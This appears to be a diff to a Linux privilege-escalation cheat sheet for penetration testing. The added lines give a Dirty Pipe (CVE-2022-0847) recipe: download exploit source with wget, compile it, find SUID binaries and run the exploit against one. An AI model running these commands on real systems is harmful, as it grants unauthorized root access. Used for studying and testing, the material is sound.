@@ -333,6 +333,13 @@ ls -l /etc/cron*                                Scheduled cron jobs
 What files are owned by a particular user, but are not present in their home directory?
 What are the files present in the /home/user folder? Are there any hidden files and folders?
 What groups does the user belong to?
+
+- Dirty Pipe (CVE-2022-0847)
+Requires Linux 5.8 or later.
+wget https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c
+gcc dirtypipez.c -o dirtypipez
+find / -perm 4000 2>/dev/null
+./dirtypipez <binary>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Processes
